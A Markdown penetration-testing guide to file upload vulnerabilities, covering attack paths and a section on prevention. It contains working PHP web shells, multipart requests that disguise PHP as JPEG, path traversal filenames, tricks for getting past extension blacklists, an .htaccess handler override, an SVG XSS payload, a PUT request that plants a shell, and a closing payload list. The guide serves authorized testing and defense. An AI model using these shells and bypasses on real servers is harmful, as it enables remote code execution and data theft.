# File upload vulnerabilities

File upload vulnerabilities occur when an application lets users upload files without strict controls on **name**, **path**, **type**, **content**, **size**, and **post-upload handling**. The worst case is remote code execution (RCE) via an uploaded server-side script (a web shell), but even “image-only” uploads can lead to stored XSS, sensitive data exposure, overwriting files, path traversal writes, or denial of service.

> Only test systems you own or are explicitly authorized to assess.

## Why file uploads are dangerous (core model)
A file upload feature is two problems in one:

1) **Ingress**: can I get arbitrary bytes onto the server?  
2) **Activation**: can I make those bytes do something harmful (execute server-side, execute client-side, get parsed by a vulnerable library, overwrite something, or fill disk)?

Attack impact depends on:
- What the server accepts (extension/MIME/content/size).
- Where it stores the file (web root vs private storage).
- How it serves it back (static hosting, content-type sniffing, CSP, same-origin).
- Whether it executes or parses the file (PHP/JSP, image processors, document parsers).
- Whether filenames/paths are controllable (overwrite/traversal).

## How servers treat uploaded files (why “extension” matters)
Most web servers map request paths to a file extension and then decide whether to:
- Serve it as **static** content (download/render).
- Treat it as **executable** (run PHP/JSP/ASP.NET handler).
- Reject it (unknown type / forbidden).

If you can upload an executable extension into a directory that executes scripts, requesting that file can execute code.

If you can upload a file into a directory that does **not** execute scripts, you may still:
- Leak source code (file served as text).
- Get stored XSS (HTML/SVG).
- Abuse parsers (XXE, deserialization, image library bugs).

## High-impact exploitation paths (with concrete examples)

### 1) Unrestricted upload → web shell → RCE
Worst case: server accepts script files and executes them.

Example PHP web shell patterns:
```php
<?php echo system($_GET['command']); ?>
```

Trigger:
```http
GET /uploads/shell.php?command=id HTTP/1.1
Host: target.tld
```

Even a “read file” one-liner can be devastating:
```php
<?php echo file_get_contents('/etc/passwd'); ?>
```

Key tester objective: confirm **execution**, not just upload success.

### 2) Content-Type trust bypass (multipart/form-data)
Many apps “validate” only the per-part `Content-Type`, which is attacker-controlled.

Typical upload request structure:
```http
POST /images HTTP/1.1
Host: target.tld
Content-Type: multipart/form-data; boundary=----BOUND

------BOUND
Content-Disposition: form-data; name="image"; filename="shell.php"
Content-Type: image/jpeg

<?php echo system($_GET['command']); ?>
------BOUND--
```

If the server only checks `Content-Type: image/jpeg` and not the actual bytes, the upload may pass even though the content is PHP.

What to test:
- Change the per-part `Content-Type` to an allowed value while keeping payload bytes.
- Try “allowed” extensions plus server parsing quirks (see obfuscation below).

### 3) Upload path traversal (write into executable directories)
If filename is used directly in a filesystem path, traversal may allow writes outside the intended upload folder.

Example malicious filename:
```text
../../../../var/www/html/shell.php
```

Multipart example:
```http
Content-Disposition: form-data; name="file"; filename="../../../../var/www/html/shell.php"
```

If the server normalizes poorly, you might land the file in a directory where scripts execute.

What to test:
- `../` and encoded variants (`%2e%2e%2f`, double-encoding).
- Windows separators: `..\`.
- Mixed slashes, trailing dots, unusual Unicode normalizations.

### 4) Extension blacklist bypass (dangerous “block .php” logic)
Blacklists are fragile. Even if `.php` is blocked, servers may execute alternative extensions or be tricked by parsing differences.

Common bypass families:
- Alternate executable extensions: `.php5`, `.phtml`, `.phar`, `.shtml` (environment-dependent).
- Case tricks: `shell.pHp` (validator case-sensitive, handler case-insensitive).
- Double extensions: `shell.php.jpg` (depends on “first dot vs last dot” parsing).
- Trailing junk: `shell.php.` or `shell.php   ` (some components trim/normalize).
- Encoded dot: `shell%2Ephp` (if validation happens before decode).
- Semicolon: `shell.asp;.jpg` (historical/IIS-ish parsing patterns).
- Null byte: `shell.php%00.jpg` (legacy/native boundary issues).
- Non-recursive stripping: transform `shell.p.phphp` by stripping `.php` once, leaving `.php`.

Practical approach:
- Determine how the server decides file type:
  - “Last extension wins” vs “first extension wins”
  - Normalization before validation vs after validation
- Use response behavior to infer parsing rules.

### 5) Uploading a server config file to enable execution
Some servers allow per-directory configuration that can map extensions to executable handlers.

If the application lets you upload files like:
- Apache: `.htaccess`
- IIS: `web.config`

You might be able to define a handler for an otherwise “safe” extension.

Apache-style concept (illustrative):
```apacheconf
AddType application/x-httpd-php .pwn
```

Then upload:
```text
shell.pwn
```

IIS-style example (illustrative MIME mapping is not execution by itself, but shows the idea of directory-level overrides):
```xml
<configuration>
  <system.webServer>
    <staticContent>
      <mimeMap fileExtension=".json" mimeType="application/json" />
    </staticContent>
  </system.webServer>
</configuration>
```

Tester checklist:
- Can you upload dotfiles or config-like filenames?
- Are they stored in a directory where the server honors per-directory config?

### 6) Polyglots (content-based validation bypass)
Apps sometimes verify “magic bytes” (file signatures) like JPEG `FF D8 FF`. That’s better than trusting headers, but can still be bypassed using polyglots (valid image structure + embedded payload in metadata).

Example JPEG signature bytes (conceptual):
```text
FF D8 FF ...
```

Approach:
- Create a file that passes image checks (dimensions/magic bytes).
- Embed payload where the app doesn’t inspect (metadata).
- Combine with an execution vector (server-side handler misconfig) or client-side rendering (SVG/HTML).

### 7) Race conditions in upload validation (TOCTOU)
Some implementations:
- Write file to final location first,
- Then scan/validate,
- Then delete if unsafe.

If there’s a time window where the file is accessible, an attacker may request it before it’s removed.

Indicators:
- Upload returns quickly but validation seems asynchronous.
- Temporary filenames are predictable.
- You can access the uploaded file immediately after upload (even briefly).

URL-based uploads (server fetches from a URL) can have similar races because the app implements its own download + temp storage + validation pipeline.

### 8) File uploads without server-side execution (still exploitable)

#### Stored XSS via HTML/SVG
If you can upload HTML or SVG and it’s served from the same origin, it may execute scripts when other users view it.

Example risky upload types:
- `.html`, `.svg`, sometimes `.xml`

SVG example (scriptable):
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

Key condition: it must be served from a context where the browser executes it (same origin, correct content-type or sniffing behavior, insufficient CSP).

#### Exploit vulnerable parsers
If the app processes uploaded files (virus scanning, image resizing, PDF preview, Office conversion), target the parser:
- XML-based documents → XXE (where applicable)
- Image libraries → historical memory corruption (environment-dependent)
- Archive handling → zip slip (path traversal inside archives)

#### DoS via size / decompression bombs
If size limits are weak:
- Large files fill disk.
- Huge image dimensions exhaust memory.
- Zip bombs explode during scanning or preview generation.

### 9) PUT-based uploads (no upload form required)
Some servers accept `PUT` to create/replace files.

Discovery:
- Send `OPTIONS` to see allowed methods.
- Try `PUT` to a writable path.

Example:
```http
PUT /images/shell.php HTTP/1.1
Host: target.tld
Content-Type: application/x-httpd-php
Content-Length: 45

<?php echo system($_GET['command']); ?>
```

Even if direct execution is blocked, PUT may still enable overwrites, defacement, or storage abuse.

## How to test file uploads systematically (field checklist)

### 1) Identify the upload pipeline
For each upload feature, capture:
- Endpoint(s) used (POST /upload, /api/files, pre-signed S3 URL).
- Request format: `multipart/form-data`, JSON base64, URL-based fetch.
- Server response: file URL, ID, preview URL, CDN domain.

Questions to answer:
- Where is it stored (web root, object storage, temp dir)?
- Is it accessible publicly?
- Is it served from the same origin?
- Is it renamed? Is the name predictable?
- Is validation consistent across all nodes (reverse proxy vs app server vs storage)?

### 2) Test input points (name, type, content, size, metadata)
- Filename:
  - traversal sequences `../`, encoded variants
  - collisions `avatar.png` overwrite tests
  - double extensions, case changes, trailing dots/spaces
- MIME type:
  - per-part `Content-Type` manipulation
  - missing content-type, unusual values
- File content:
  - magic bytes valid, body malicious
  - polyglots, metadata tricks
- Size:
  - large files, high-resolution images, compressed bombs (authorized only)

### 3) Validate “post-upload restrictions”
After upload, test:
- Can you request it directly?
- What `Content-Type` is returned?
- Does it have `Content-Disposition: attachment`?
- Is there a strong CSP?
- Are `X-Content-Type-Options: nosniff` and correct MIME types set?
- Are scripts executed in that directory?

## Prevention (what to implement in real systems)

### 1) Prefer allow-lists over blacklists
- Allow only known-good extensions for the use case (e.g., `.jpg`, `.png`, `.pdf`).
- Allow only known-good MIME types (but don’t rely on them alone).

### 2) Verify content, not just headers
- Check magic bytes / file signatures.
- Validate structure (image decoding, PDF parsing) using safe libraries.
- Reject files with active content where not needed (HTML/SVG).

### 3) Generate server-side filenames and store outside web root
- Ignore the user’s filename for storage; generate random names (UUID) and keep original as metadata only.
- Store uploads outside any executable directory.
- Serve via an authenticated download endpoint for sensitive files.

Example storage naming:
```text
uploads/
  5c2d9c9f-8a2c-4fb3-9c8a-3d2b9c1f2b7e.bin
```

### 4) Prevent execution in upload directories (second line of defense)
- Configure the upload directory as non-executable.
- Disable handler mappings for scripts in that path.
- On Apache/IIS/Nginx, ensure the upload path cannot override config via user-uploaded files (block `.htaccess`, `web.config`, dotfiles).

### 5) Path safety and overwrite protections
- Reject any filename containing path separators or traversal patterns.
- Canonicalize and enforce base-directory containment when constructing paths.
- Use atomic file creation to prevent overwrite (`O_EXCL` style behavior).
- Set strict permissions on upload directories.

### 6) Size limits and resource controls
- Enforce server-side max size (request body + per-file).
- Enforce image dimension limits after decoding (not just file size).
- Stream to disk with quotas; avoid buffering entire files in memory.
- Apply rate limits to upload endpoints.

### 7) Safe processing pipeline
- Don’t move files to permanent storage until they pass validation.
- Use well-tested framework upload handlers.
- If using antivirus/scanning, do it **before** making the file reachable, and avoid “upload then delete” races.

### 8) Secure serving headers
For user-uploaded files:
- Prefer `Content-Disposition: attachment` (download) unless you explicitly need inline rendering.
- Set `X-Content-Type-Options: nosniff`.
- Use a dedicated asset domain to isolate from your main origin (reduces XSS impact).
- Use a strong CSP on any pages that display user-uploaded content.

## Quick tester payload set (authorized use)
Filename variations:
```text
shell.php
shell.pHp
shell.php.jpg
shell%2Ephp
shell.php.
../../../../var/www/html/shell.php
```

Multipart content-type tricks:
```text
filename="shell.php" + Content-Type: image/jpeg
filename="avatar.jpg" + body contains script
```

Method discovery:
```bash
curl -i -X OPTIONS https://target.tld/upload
curl -i -X PUT https://target.tld/uploads/test.txt --data 'hello'
```
